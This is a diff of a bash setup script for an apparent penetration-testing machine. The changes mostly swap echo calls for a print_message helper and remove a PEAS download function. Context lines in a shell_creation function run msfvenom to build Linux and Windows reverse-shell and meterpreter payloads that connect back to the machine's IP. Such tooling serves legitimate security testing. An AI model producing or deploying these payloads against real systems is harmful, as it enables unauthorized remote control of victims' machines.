@@ -80,22 +80,6 @@ function jon {
     echo "Ol' Jon, kickin' them rocks again \n"
 }
 
-
-function peas_download {
-    # For the time being - just scrub the PEAS directory and re-obtain
-    if [[ -d "${dldir}/PEAS" ]]; then
-        # Lol, risky
-        print_message "debug" "rm -rf ${dldir}/PEAS"
-        run_and_log sudo rm -rf "${dldir}/PEAS"
-        print_message "debug" "grab_peas"
-        grab_peas
-    else
-        print_message "debug" "grab_peas"
-        grab_peas
-    fi
-}
-
-
 function msfdb_init {
     # TODO: Check and make sure the msfdb is actually up and running (msfdb run)
     print_message "info" "Initializing MSF database"
@@ -208,6 +192,7 @@ ff02::2 ip6-allrouters" > /etc/hosts
 
 # TODO: Come up with naming convention for shells & organize based off target architecture
 # TODO: Add platform and target architecture
+# TODO: Make msfvenom payload generation as submethods
 shell_creation() {
   
   listen_port=6969
@@ -227,14 +212,14 @@ shell_creation() {
   ip_addr=$(ip addr show "$selected_interface" | grep "\<inet\>" | awk '{ print $2 }' | awk -F "/" '{ print $1 }' | tr -d '\n')
 
   if [[ -z "$ip_addr" ]]; then
-    echo "No IP address found for the selected interface. Exiting."
+    print_message "error" "No IP address found for the selected interface. Exiting."
     exit 1
   fi
 
-  echo -e "Selected interface is: $selected_interface"
-  echo -e "Interface address is: $ip_addr"
-  echo -e "Port being used for shells is $listen_port"
-  echo "                                                   Nice"
+  print_message "Selected interface is: $selected_interface"
+  print_message "Interface address is: $ip_addr"
+  print_message "Port being used for shells is $listen_port"
+  print_message "blue" "                                                   Nice"
   msfvenom -p linux/x64/shell_reverse_tcp RHOST=$ip_addr LPORT=$listen_port -f elf > /tmp/test.elf
   msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=$ip_addr LPORT=$listen_port -f elf > /tmp/meter_rev_test.elf
   msfvenom -p windows/meterpreter/reverse_tcp LHOST=$ip_addr LPORT=$listen_port -f exe > /tmp/test.exe
@@ -262,7 +247,7 @@ shh() {
 
 silence_pcbeep () { # I stop the ridiculous terminal beeping !
     sudo echo -e "blacklist pcspkr" > /etc/modprobe.d/nobeep.conf
-    echo -e "\n  ${GREEN} Terminal Beep Silenced! /etc/modprobe.d/nobeep.conf \n ${NC}"
+    print_message "green" "\n  Terminal Beep Silenced! /etc/modprobe.d/nobeep.conf \n"
 }
 
 structure_setup() {
